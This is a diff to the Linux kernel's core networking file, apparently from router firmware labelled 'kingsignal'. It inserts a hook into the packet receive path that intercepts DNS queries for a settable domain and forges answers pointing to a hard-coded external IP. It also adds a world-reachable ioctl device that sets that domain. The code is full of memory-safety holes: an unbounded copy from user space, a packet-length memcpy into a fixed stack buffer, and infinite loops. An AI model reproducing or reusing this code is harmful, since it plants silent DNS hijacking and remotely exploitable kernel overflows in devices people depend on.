@@ -182,6 +182,716 @@ static struct list_head offload_base __read_mostly;
 DEFINE_RWLOCK(dev_base_lock);
 EXPORT_SYMBOL(dev_base_lock);
 
+/*kingsignal begin*/
+#include <linux/version.h>
+#include <linux/inetdevice.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/device.h>
+#include <linux/cdev.h>
+
+
+
+
+
+
+#if 1
+#define PRIVATE_DOMAIN_DEVNAME		"kingsignalmain"
+#define PRIVATE_DOMAIN_IOCTL_SET	0x01
+#define PRIVATE_DOMAIN_IOCTL_GET	0x02
+
+static int private_domain_major = 556;
+//static char g_sz_private_domain[64] = "auth.zeropoint8.com";
+//static int g_n_private_domain_len = 18;
+
+static char g_sz_private_domain[64] = "www.dubai.com";
+static int g_n_private_domain_len = 12;
+static int g_n_set_private_domain_ok = 1;
+
+#define TERMINAL_NUM 200
+typedef struct domain_table
+{
+	char hwMac[18];
+	int flag;
+}domain_table_t;
+domain_table_t kingsignal_domain[TERMINAL_NUM]={0};
+
+
+
+
+#ifdef  CONFIG_DEVFS_FS
+#include <linux/devfs_fs_kernel.h>
+static  devfs_handle_t devfs_handle2;
+#endif
+
+int private_domain_open(struct inode *inode, struct file *file)
+{
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,0)
+	MOD_INC_USE_COUNT;
+#else
+	try_module_get(THIS_MODULE);
+#endif
+	return 0;
+}
+
+int private_domain_release(struct inode *inode, struct file *file)
+{
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,0)
+	MOD_DEC_USE_COUNT;
+#else
+	module_put(THIS_MODULE);
+#endif
+	return 0;
+}
+
+
+#if LINUX_VERSION_CODE > KERNEL_VERSION(2,6,35)
+long private_domain_ioctl(struct file *file, unsigned int req,
+		unsigned long arg)
+#else
+int private_domain_ioctl(struct inode *inode, struct file *file, unsigned int req,
+		unsigned long arg)
+#endif
+{
+	switch (req) {
+	case PRIVATE_DOMAIN_IOCTL_SET:
+		if(copy_from_user(g_sz_private_domain, (char *)arg, strlen((char *)arg))) {
+			return -EFAULT;
+		}
+		
+		if(strlen(g_sz_private_domain) > 3)//g.cn
+		{
+			g_n_set_private_domain_ok = 1;
+
+			g_n_private_domain_len = strlen(g_sz_private_domain);
+		}
+		
+		printk(">>>PRIVATE_DOMAIN_IOCTL_SET g_sz_private_domain=%s<<<\n",g_sz_private_domain);
+
+		break;
+
+	case PRIVATE_DOMAIN_IOCTL_GET:
+		if (copy_to_user((char *)arg, g_sz_private_domain, g_n_private_domain_len+1))
+			return -EFAULT;
+
+		printk(">>>PRIVATE_DOMAIN_IOCTL_GET g_sz_private_domain=%s<<<\n",g_sz_private_domain);
+
+		break;
+
+	default:
+		break;
+	}
+
+	return 0;
+}
+
+struct file_operations private_domain_fops =
+{
+	owner:		THIS_MODULE,
+#if LINUX_VERSION_CODE > KERNEL_VERSION(2,6,35)
+	unlocked_ioctl:	private_domain_ioctl,
+#else
+	ioctl:		private_domain_ioctl,
+#endif
+	open:		private_domain_open,
+	release:	private_domain_release,
+};
+
+static struct class *my_class;
+struct cdev cdev;
+
+int __init private_domain_init(void)
+{
+	printk(">>>private_domain_init start<<<\n");
+	
+	int error, devno = MKDEV (private_domain_major, 0);
+	
+	error = register_chrdev_region(devno, 1,"/dev/kingsignalmain");
+	if( error < 0)	
+	{
+		printk(KERN_ERR "private_domain: unable to register character device\n");
+		return 0;
+	}
+	
+	cdev_init(&cdev, &private_domain_fops);
+	cdev.owner = THIS_MODULE;
+    cdev.ops = &private_domain_fops;
+	
+	error = cdev_add (&cdev, devno , 1);
+    if (error)
+        printk (KERN_NOTICE "private_domain_init cdev_add error\n");
+	
+	
+	my_class = class_create(THIS_MODULE, "kingsignalmain");
+	if(IS_ERR(my_class)) 
+	{
+        printk("Err: failed in creating class.\n");
+        return 0;
+    }
+	
+	device_create(my_class,NULL, devno, NULL,"kingsignalmain");
+	
+	printk(">>>private_domain_init end<<<\n");
+	return 0;
+}
+
+late_initcall(private_domain_init);
+#endif
+
+#if 1
+/*add by wwk,20160305*/
+typedef struct _dns
+{
+	unsigned short id;
+	unsigned short flags;
+	unsigned short quests;
+	unsigned short answers;
+	unsigned short author;
+	unsigned short addition;
+}DNS,*PDNS;
+
+typedef struct _response
+{
+	unsigned short name; 
+	unsigned short type;
+	unsigned short classes;
+	unsigned int ttl;
+	unsigned short length;
+	unsigned int  addr;
+}DNSRESPONSE,*PDNSRESPONSE;
+
+int compare_domain_name(unsigned char* pdomain)
+{
+	int i ;
+	unsigned char domain_name_temp[64] = "" ;
+    printk(">>> pdomain[%s]<<<\n",pdomain);
+	if(NULL == pdomain)
+	{
+		return false;
+	}
+	
+	for(i=1 ; i<64 ; i++)
+	{
+		if(*(pdomain + i) == '\0')
+		{
+			break ;
+		}
+		else if(*(pdomain + i) < 32)
+		{
+			domain_name_temp[i-1] = '.' ;
+		}
+		else
+		{
+			domain_name_temp[i-1] = *(pdomain + i);
+		}
+	}
+
+	printk(">>>compare_domain_name domain_name_temp[%s] g_sz_private_domain[%s]<<<\n",domain_name_temp,g_sz_private_domain);
+	
+	if(0 == strncasecmp(domain_name_temp ,g_sz_private_domain, g_n_private_domain_len))
+	{
+		printk(">>>found domain[%s]<<<\n",domain_name_temp);
+		
+		return true;
+	}
+	else
+	{
+		return false;
+	}
+}
+
+static __be32 get_lan_ipaddr()
+{
+	struct net_device *each_dev = NULL;
+	struct in_device *in_dev = NULL;
+	__be32 addr  = 0x0;
+	
+	read_lock(&dev_base_lock);
+	for_each_netdev(&init_net, each_dev){
+		if(each_dev && !strcmp(each_dev->name,"br0"))
+		{
+			rcu_read_lock();
+			if ((in_dev = __in_dev_get_rcu(each_dev)) != NULL && in_dev->ifa_list) {
+				addr = in_dev->ifa_list->ifa_local;
+				rcu_read_unlock();
+				break;
+			}
+			rcu_read_unlock();
+		}
+	}
+	read_unlock(&dev_base_lock);
+	
+	return addr;
+}
+
+#if 0
+static unsigned long get_domain_ip(const char* host_name)
+{
+	struct hostent* host;
+	struct in_addr addr;
+	char ** pp;
+
+	host = gethostbyname(host_name);
+	if(NULL == host)
+	{
+		printk("get_domain_ip: gethostbyname %s failed,try again\n", host_name);
+
+		sleep(2) ;
+		
+		host = gethostbyname(host_name);
+		
+		if(NULL == host)
+		{
+			return -1;
+		}
+	}
+	pp = host->h_addr_list;
+	
+	if(*pp != NULL)
+	{
+		addr.s_addr = *((unsigned int *)*pp);
+		pp++;
+		
+		printf("get_domain_ip: gethostbyname %s sucess.\n", host_name);
+
+		return addr.s_addr;
+	}
+
+	printk("get_domain_ip: gethostbyname %s fail.\n", host_name);
+
+	return 0;
+}
+#endif
+
+void *_memset(void *dest, int set, unsigned len)
+{
+	if (dest == NULL || len < 0)
+	{
+		return NULL;
+	}
+	char *pdest = (char *)dest;
+	while (len-->0)
+	{
+		*pdest++ = set;
+	}
+	return dest;
+}
+
+int _strcmp(const char* src, const char* dst)
+{
+    int ret = 0;
+    while( !(ret = *(unsigned char*)src - *(unsigned char*)dst) && *dst)
+    {
+        src ++;
+        dst ++;
+    }
+    if( ret < 0) ret = -1;
+    else if(ret > 0) ret = 1;
+    return ret;
+}
+
+int _strlen(const char* src)
+{
+    int len = 0;
+    while(*src++ != '\0')
+        len ++;
+    return len;
+}
+
+char* _strcpy(char *strDest, const char* strSrc)
+{
+    char *p=NULL;
+    if(strDest == NULL || strSrc == NULL)
+    {
+        return NULL;
+    }
+    p = strDest;
+    while((*strDest++ = *strSrc ++) != '\0');
+    return p;
+}
+
+static int build_and_send_dns_packet(struct sk_buff *oldskb)
+{
+	struct sk_buff *nskb;
+	struct ethhdr* old_ethhdr ;
+	struct ethhdr* new_ethhdr;
+	struct iphdr *oldiph ;
+	struct iphdr *niph;
+	struct udphdr _oudph, *ouh , *udph ;
+	unsigned char dnstemp[256] = "" ;// store dns head and data
+	unsigned char dnsname[128] = "" ;// store dns query data copy from the old skb_buff
+	unsigned char dnsanswertemp[20] ="";//used at answer , delete two not used bytes
+	unsigned short temp ;//used at dns.id
+	unsigned short dnsdatagramlen = 0 ;//the length of the whole dns data of respond
+	char*olddnsdata = NULL ;
+	char *oldp = NULL	;
+	DNS dnsword ;//struct dns head
+	DNSRESPONSE responseword ;
+	int dnsquelen = 0 ;
+	int dnslen = 0 ;
+	int i=0;
+	char macTmpBuf[18]={0};
+	
+	old_ethhdr= (struct ethhdr*)(oldskb->mac_header);
+
+	if(NULL ==old_ethhdr)
+	{
+		printk("build_and_send_dns_packet:old_ethhdr is NULL\n") ;
+
+		return 0;
+	}
+	
+	oldiph = ip_hdr(oldskb);
+	if((NULL == oldiph) || (oldiph->frag_off & htons(IP_OFFSET)))
+	{
+		printk("build_and_send_dns_packet:oldiph is NULL\n") ;
+		return 0;
+	}
+
+	ouh = skb_header_pointer(oldskb, ip_hdrlen(oldskb), sizeof(_oudph), &_oudph);
+
+	if(NULL == ouh)
+	{
+		printk("build_and_send_dns_packet:ouh is NULL\n") ;		
+		return 0;
+	}
+	
+	oldp = (char*)ouh +sizeof(struct udphdr) ;
+	
+	if((NULL == oldp) || (NULL == (oldp+sizeof(DNS))))
+	{
+		printk("build_and_send_dns_packet:oldp is NULL\n");
+		return 0 ;
+	}
+	
+	if(nf_ip_checksum(oldskb, 0, ip_hdrlen(oldskb), IPPROTO_UDP))
+	{
+		printk("build_and_send_dns_packet:nf_ip_checksum error\n") ;
+		return 0;
+	}
+	
+	nskb = skb_copy_expand(oldskb, LL_MAX_HEADER, skb_tailroom(oldskb),
+			       GFP_ATOMIC);
+	if(!nskb)
+	{
+		printk("build_and_send_dns_packet:nskb is NULL\n") ;
+		return 0;
+	}
+	
+	memset(&dnsword, 0 , sizeof(dnsword) ) ;
+	memcpy(&temp , oldp, 2);
+	dnsword.id = temp ;
+	dnsword.flags = htons(0x8580);   
+	dnsword.quests = htons(1);
+    dnsword.answers = htons(1);
+	dnsword.author = 0;
+	dnsword.addition = 0;
+ 	dnsquelen =ntohs(ouh->len)-sizeof(struct udphdr)-sizeof(DNS);
+	olddnsdata = (char*)ouh +sizeof(struct udphdr)+sizeof(DNS) ;
+
+	if(NULL == olddnsdata)
+	{
+		printk("olddnsdata is NULL\n");	
+		return 0;
+	}
+	
+	memset(dnsname , 0 , sizeof(dnsname)) ;
+	memcpy(dnsname , olddnsdata ,dnsquelen) ;
+	responseword.name = htons(0xc00c); 
+	responseword.type = htons(0x01);
+	responseword.classes = htons(0x01);
+	responseword.ttl = 0x0;
+	responseword.length = htons(4);
+	//responseword.addr = get_lan_ipaddr();
+	responseword.addr=3452093834;//ok 138.197.194.205
+	//responseword.addr=17213632;//ok 1.6.168.192
+	memset(dnsanswertemp, 0 , sizeof(dnsanswertemp)) ;
+	memcpy(dnsanswertemp , &responseword.name , 6);
+	memcpy(dnsanswertemp+6 , &responseword.ttl, 4) ;
+	memcpy(dnsanswertemp+10 , &responseword.length, 2) ;
+	memcpy(dnsanswertemp+12, &responseword.addr,4);
+	dnslen = sizeof(DNS)+ dnsquelen +16 ;//dns len
+	memset(dnstemp , 0 , sizeof(dnstemp)) ;
+	memcpy(dnstemp , &dnsword , sizeof(DNS) ) ;//dns head
+	memcpy(dnstemp+ sizeof(DNS) , dnsname , dnsquelen);//dns query
+	memcpy(dnstemp+sizeof(DNS)+dnsquelen, dnsanswertemp, 16) ;//dns answer
+	skb_put(nskb, sizeof(struct udphdr) + dnslen);
+	udph = (struct udphdr *)((char*)skb_network_header(nskb) + ip_hdrlen(nskb));
+	udph->source = ouh->dest ;
+	udph->dest = ouh->source ;
+	udph->len = htons(sizeof(struct udphdr)+ dnslen) ;
+	udph->check = 0 ;
+	memset((char*)udph+sizeof(struct udphdr) , 0 , dnslen) ;//modify
+	memcpy((char*)udph+sizeof(struct udphdr) , dnstemp , dnslen) ;
+	skb_put(nskb, sizeof(struct iphdr) +sizeof(struct udphdr)+dnslen );
+	niph = ip_hdr(nskb);
+	niph->version = oldiph->version ;
+	niph->ihl = oldiph->ihl ;
+	niph->tos= oldiph->tos ;
+	niph->tot_len = htons(sizeof(struct iphdr) +sizeof(struct udphdr)+dnslen ) ;
+	niph->id = 0 ;
+	niph->frag_off = htons(0x4000) ;
+	niph->ttl = 128;
+	niph->protocol =IPPROTO_UDP ;
+	niph->check = 0;
+	niph->saddr = oldiph->daddr ;
+	niph->daddr = oldiph->saddr ;
+	niph->check = ip_fast_csum(niph, niph->ihl);
+	nskb->csum = skb_checksum(nskb,niph->ihl* 4 , (sizeof(struct udphdr) + dnslen),0 ) ;
+	udph->check = csum_tcpudp_magic(niph->saddr, niph->daddr, (sizeof(struct udphdr) + dnslen), IPPROTO_UDP, nskb->csum);
+	skb_push(nskb, sizeof(struct ethhdr)) ;
+	new_ethhdr= (struct ethhdr*)(nskb->mac_header);
+	memcpy(new_ethhdr->h_dest, old_ethhdr->h_source, 6);
+	memcpy(new_ethhdr->h_source, old_ethhdr->h_dest, 6);
+	new_ethhdr->h_proto = old_ethhdr->h_proto;
+	dnsdatagramlen = sizeof(struct ethhdr)+sizeof(struct iphdr)+ sizeof(struct udphdr)+dnslen ;
+	skb_trim(nskb, dnsdatagramlen) ;//trim the len
+#if 0
+
+	struct tcphdr *tcph = NULL;
+	struct tcphdr otcph;
+	 unsigned char* mac;
+	struct iphdr *iph = (struct iphdr*)(oldskb->data);
+	mac=oldskb->mac_header+6;
+		 printk("dsmac:%02x:%02x:%02x:%02x:%02x:%02x\n",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
+	sprintf(macTmpBuf,"%02x%02x%02x%02x%02x%02x",new_ethhdr->h_dest[0],new_ethhdr->h_dest[1],new_ethhdr->h_dest[2],new_ethhdr->h_dest[3],new_ethhdr->h_dest[4],new_ethhdr->h_dest[5]);
+	printk("*************ether_dhost1=%s\n",macTmpBuf);
+
+	for(i;i<TERMINAL_NUM;i++)
+	{
+	  while(_strcmp(kingsignal_domain[i].hwMac,macTmpBuf)&&(_strlen(kingsignal_domain[i].hwMac)!=0))
+	  {
+	   continue;
+	  }
+	  if(!_strcmp(kingsignal_domain[i].hwMac,macTmpBuf))
+	   {
+		   kingsignal_domain[i].flag=1;
+		   break;
+	   }
+	}
+#endif
+	if(dev_queue_xmit(nskb) < 0)
+	{
+		printk("build_and_send_dns_packet dev_queue_xmit error\n") ;		
+		kfree_skb(nskb);
+		return false;
+	}
+	
+	return true ;
+}
+
+
+
+int check_http_packets(struct sk_buff* skb)
+{
+     unsigned char* mac;
+	 char macTmp[18]={0};
+	int i=0;
+	int ret=0;
+	struct tcphdr *tcph = NULL;
+	struct tcphdr otcph;
+	struct iphdr *iph = (struct iphdr*)(skb->data);
+	if (iph->protocol == IPPROTO_TCP)
+	{
+	 	tcph = (struct tcphdr *)((void *)iph +iph->ihl*4);
+		if ((ntohs(iph->tot_len)  -iph->ihl*4 -tcph->doff*4) == 0 )
+		{
+			return 0;
+		}
+		if((ntohs(tcph->dest) == 80) || (ntohs(tcph->dest) == 443))
+		{
+		 /*we only interest in http packets and https packets*/
+		 mac=skb->mac_header+6;
+		 printk("smac:%02x:%02x:%02x:%02x:%02x:%02x\n",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
+		 sprintf(macTmp,"%02x%02x%02x%02x%02x%02x",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
+		 for(i;i<TERMINAL_NUM;i++)
+		 {
+		   while(_strcmp(kingsignal_domain[i].hwMac,macTmp)&&(_strlen(kingsignal_domain[i].hwMac)!=0))
+		   {
+		    continue;
+		   }
+		   if(!_strcmp(kingsignal_domain[i].hwMac,macTmp))
+		   	{
+		   	    if(kingsignal_domain[i].flag!=1)
+		   	  	kingsignal_domain[i].flag=2;
+				ret=1;
+				break;
+		   	}
+		   if(_strlen(kingsignal_domain[i].hwMac)==0)
+		   	{
+		    	_strcpy(kingsignal_domain[i].hwMac,macTmp);
+				if(kingsignal_domain[i].flag!=1)
+		   	  	kingsignal_domain[i].flag=2;
+				printk("check_http_packets:%s\n",kingsignal_domain[i].hwMac);
+				ret=2;
+				break;
+		   	}
+		 }
+	//	 if(i=(TERMINAL_NUM-1))
+	//	 _memset(kingsignal_domain,0,_strlen(kingsignal_domain));
+		
+		}
+
+	}
+	return ret;
+}
+
+int search_http_target_index(const char*mac)
+{
+int i=0;
+
+for(i;i<TERMINAL_NUM;i++)
+{
+  printk("0000\n") ;
+
+  while(_strcmp(kingsignal_domain[i].hwMac,mac)&&(_strlen(kingsignal_domain[i].hwMac)!=0))
+  {
+  printk("111111\n") ;
+   break;
+  }
+  if(!_strcmp(kingsignal_domain[i].hwMac,mac))
+   {
+    printk("2222\n") ;
+     return i;   
+   }
+  if(_strlen(kingsignal_domain[i].hwMac)==0)
+   {
+    printk("3333\n") ;
+     i=TERMINAL_NUM;
+	 return i;
+   }
+}
+}
+int handle_private_dns_modified(struct sk_buff* skb)
+{
+	struct iphdr* pIpHdr;
+	struct udphdr* pUdpHdr;
+	PDNS dnshead;
+	unsigned char* pdomain;
+	int index=-1;
+	struct ethhdr* ethhdr_addr ;
+	char macTmp[18]={0};
+
+   // check_http_packets(skb);
+	if(ETH_P_IP == ntohs(skb->protocol))
+	{
+		pIpHdr = ip_hdr(skb);
+		
+		if(IPPROTO_UDP == pIpHdr->protocol)  
+		{	
+			pUdpHdr = (struct udphdr*)((char*)pIpHdr +sizeof(struct iphdr) );
+
+			if(htons(53) == pUdpHdr->dest)  
+	    	{	
+	    		dnshead = (unsigned char *) pUdpHdr + sizeof(struct udphdr);	
+				pdomain = (unsigned char *) pUdpHdr + sizeof(struct udphdr)+sizeof(DNS);
+
+				if(htons(0x0100) == dnshead->flags)
+				{
+				//	if(compare_domain_name(pdomain))
+				//ethhdr_addr=(struct ethhdr*)(skb->mac_header);
+				//sprintf(macTmp,"%02x%02x%02x%02x%02x%02x",ethhdr_addr->h_source[0],ethhdr_addr->h_source[1],ethhdr_addr->h_source[2],ethhdr_addr->h_source[3],ethhdr_addr->h_source[4],ethhdr_addr->h_source[5]);
+				//printk("ethhdr_addr->h_source=%s\n",macTmp);
+				//index=search_http_target_index(macTmp);
+                // printk("index=%d flag=%d\n",index,kingsignal_domain[index].flag);
+				 //  if((kingsignal_domain[index].flag==2)&&(index!=200))
+				 	if(compare_domain_name(pdomain))
+					{
+						if(build_and_send_dns_packet(skb) )
+						{	
+							printk("build_and_send_dns_packet\n") ;
+							return true ;
+						}
+					}
+				}
+	    	}
+    	}
+	}
+	
+	return false;
+}
+
+
+
+int handle_private_dns(struct sk_buff* skb)
+{
+	struct iphdr* pIpHdr;
+	struct udphdr* pUdpHdr;
+	PDNS dnshead;
+	unsigned char* pdomain;
+	
+	if(ETH_P_IP == ntohs(skb->protocol))
+	{
+		pIpHdr = ip_hdr(skb);
+		
+		if(IPPROTO_UDP == pIpHdr->protocol)  
+		{	
+			pUdpHdr = (struct udphdr*)((char*)pIpHdr +sizeof(struct iphdr) );
+
+			if(htons(53) == pUdpHdr->dest)  
+	    	{	
+	    		dnshead = (unsigned char *) pUdpHdr + sizeof(struct udphdr);	
+				pdomain = (unsigned char *) pUdpHdr + sizeof(struct udphdr)+sizeof(DNS);
+
+				if(htons(0x0100) == dnshead->flags)
+				{
+					if(compare_domain_name(pdomain))
+					{
+						if(build_and_send_dns_packet(skb) )
+						{	
+							printk("build_and_send_dns_packet\n") ;
+							return true ;
+						}
+					}
+				}
+	    	}
+    	}
+	}
+	
+	return false;
+}
+
+int handle_private_dns_back(struct sk_buff* skb)
+{
+	struct iphdr* pIpHdr;
+	struct udphdr* pUdpHdr;
+	PDNS dnshead;
+	unsigned char* pdomain;
+	
+	if(ETH_P_IP == ntohs(skb->protocol))
+	{
+		pIpHdr = ip_hdr(skb);
+		
+		if(IPPROTO_UDP == pIpHdr->protocol)  
+		{	
+			pUdpHdr = (struct udphdr*)((char*)pIpHdr +sizeof(struct iphdr) );
+
+			if(htons(53) == pUdpHdr->dest)  
+	    	{	
+	    		dnshead = (unsigned char *) pUdpHdr + sizeof(struct udphdr);	
+				pdomain = (unsigned char *) pUdpHdr + sizeof(struct udphdr)+sizeof(DNS);
+
+				if(htons(0x0100) == dnshead->flags)
+				{
+					if(compare_domain_name(pdomain))
+					{
+						if(build_and_send_dns_packet(skb) )
+						{	
+							printk("build_and_send_dns_packet\n") ;
+							return true ;
+						}
+					}
+				}
+	    	}
+    	}
+	}
+	
+	return false;
+}
+
+/*end*/
+#endif
+
 seqcount_t devnet_rename_seq;
 
 static inline void dev_base_seq_inc(struct net *net)
@@ -3728,6 +4438,22 @@ ncls:
 		}
 	}
 
+#if 1
+					/*kingsignal add,20191217*/
+					if(g_n_set_private_domain_ok)
+					{
+						if(handle_private_dns(skb))
+						{
+							if(skb)
+							{
+								kfree_skb(skb);
+							}
+							goto out;	
+						}
+					}
+					/*end add*/
+#endif	
+
 	if (pt_prev) {
 		if (unlikely(skb_orphan_frags(skb, GFP_ATOMIC)))
 			goto drop;
@@ -3795,6 +4521,7 @@ static int __netif_receive_skb(struct sk_buff *skb)
 			#endif
 			)
 		#endif
+
 		if (rtl_netif_receive_skb_hooks(&skb)==RTL_PS_HOOKS_RETURN)
 			return NET_RX_SUCCESS;
 #if defined(CONFIG_RTL_819X_SWCORE)		
@@ -3804,7 +4531,6 @@ static int __netif_receive_skb(struct sk_buff *skb)
 
 		ret = __netif_receive_skb_core(skb, false);
 	}
-
 	return ret;
 }
 
